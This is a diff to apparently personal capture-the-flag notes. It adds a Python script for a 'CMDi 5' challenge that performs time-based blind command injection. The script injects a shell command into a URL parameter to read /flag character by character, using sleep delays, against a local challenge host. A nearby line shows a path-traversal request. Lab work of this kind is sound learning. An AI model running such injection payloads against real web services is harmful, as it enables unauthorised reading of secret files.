@@ -60,5 +60,20 @@ DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
 
 #### CMDi 5
 
-it seems that we can't even know the delay, it just immediately prints the
-output that contains our command.
+```python
+import requests
+import time
+
+j = 1
+flag = ""
+while True:
+    for i in range(33, 127):
+        start = time.time()
+        URL = f"http://challenge.localhost:80/quest?file-ref=/challenge/PWN;if [ $(cat /flag | cut -c {j} ) = '{chr(i)}' ]; then sleep 3; fi"
+        r = requests.get(URL)
+        end = time.time()
+        if (end - start) >= 3:
+            flag+=chr(i)
+            print(flag)
+    j+=1
+```
